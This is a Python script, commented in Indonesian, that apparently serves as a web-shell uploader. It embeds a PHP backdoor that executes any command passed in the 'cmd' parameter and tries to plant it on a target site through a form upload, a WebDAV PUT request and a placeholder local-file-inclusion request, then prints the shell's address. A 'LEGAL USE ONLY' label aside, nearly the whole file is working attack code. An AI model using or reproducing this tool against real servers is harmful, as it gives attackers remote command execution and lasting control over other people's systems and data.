import requests
import threading
import os
from urllib.parse import urljoin
from concurrent.futures import ThreadPoolExecutor
import argparse
import sys

# Konten shell PHP (contoh sederhana dengan backdoor)
shell_payload = """
<?php
if(isset($_GET['cmd'])) {
    $cmd = $_GET['cmd'];
    echo "<pre>";
    system($cmd);
    echo "</pre>";
} else {
    echo "Shell aktif. Gunakan ?cmd=[perintah]";
}
?>
"""

# Daftar metode upload yang akan dicoba
METHODS = {
    "direct_upload": "Mengunggah langsung via formulir upload",
    "webdav": "Mengunggah via WebDAV (PUT method)",
    "lfi": "Menyisipkan shell via Local File Inclusion (dummy)"
}

class ShellUploader:
    def __init__(self, target_url, proxies=None, threads=5):
        self.target_url = target_url.rstrip('/')
        self.proxies = proxies
        self.threads = threads
        self.session = requests.Session()
        self.shell_name = "shell.php"
        self.success = False

    def save_shell(self):
        """Simpan shell ke file lokal sementara"""
        with open(self.shell_name, "w") as f:
            f.write(shell_payload)

    def cleanup(self):
        """Hapus file sementara"""
        if os.path.exists(self.shell_name):
            os.remove(self.shell_name)

    def check_response(self, response, method):
        """Cek apakah upload berhasil berdasarkan respons"""
        if response.status_code in [200, 201, 204]:
            print(f"[+] Berhasil dengan {method}! Respons: {response.status_code}")
            shell_url = urljoin(self.target_url, self.shell_name)
            print(f"[*] Coba akses shell di: {shell_url}")
            self.success = True
            return True
        print(f"[-] Gagal dengan {method}. Kode: {response.status_code}")
        return False

    def direct_upload(self, endpoint="/upload.php"):
        """Metode 1: Upload langsung via formulir"""
        upload_url = urljoin(self.target_url, endpoint)
        files = {"file": (self.shell_name, open(self.shell_name, "rb"), "application/x-php")}
        data = {"submit": "Upload"}
        
        try:
            response = self.session.post(upload_url, files=files, data=data, proxies=self.proxies, timeout=10)
            return self.check_response(response, "Direct Upload")
        except Exception as e:
            print(f"[-] Error Direct Upload: {e}")
            return False

    def webdav_upload(self):
        """Metode 2: Upload via WebDAV (PUT request)"""
        upload_url = urljoin(self.target_url, self.shell_name)
        headers = {"Content-Type": "application/x-php"}
        
        try:
            response = self.session.put(upload_url, data=shell_payload, headers=headers, proxies=self.proxies, timeout=10)
            return self.check_response(response, "WebDAV")
        except Exception as e:
            print(f"[-] Error WebDAV: {e}")
            return False

    def lfi_inject(self, endpoint="/index.php?page="):
        """Metode 3: Dummy LFI untuk menyisipkan shell (harus ada kerentanan LFI)"""
        upload_url = urljoin(self.target_url, endpoint + self.shell_name)
        try:
            # Misalnya, menyisipkan shell via log poisoning atau LFI (logika dummy)
            response = self.session.get(upload_url, proxies=self.proxies, timeout=10)
            return self.check_response(response, "LFI Injection")
        except Exception as e:
            print(f"[-] Error LFI: {e}")
            return False

    def run(self):
        """Jalankan semua metode secara paralel"""
        self.save_shell()
        print(f"[*] Mencoba mengunggah shell ke {self.target_url}...")

        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = [
                executor.submit(self.direct_upload),
                executor.submit(self.webdav_upload),
                executor.submit(self.lfi_inject)
            ]
            for future in futures:
                future.result()

        self.cleanup()
        if not self.success:
            print("[-] Tidak ada metode yang berhasil. Target mungkin aman atau memerlukan pendekatan lain.")

def main():
    parser = argparse.ArgumentParser(description="Shell Uploader untuk pengujian keamanan (LEGAL USE ONLY)")
    parser.add_argument("url", help="Target URL (e.g., http://example.com)")
    parser.add_argument("--proxy", help="Gunakan proxy (e.g., http://127.0.0.1:8080)", default=None)
    parser.add_argument("--threads", type=int, help="Jumlah thread (default: 5)", default=5)
    args = parser.parse_args()

    proxies = {"http": args.proxy, "https": args.proxy} if args.proxy else None
    uploader = ShellUploader(args.url, proxies=proxies, threads=args.threads)
    uploader.run()

if __name__ == "__main__":
    main()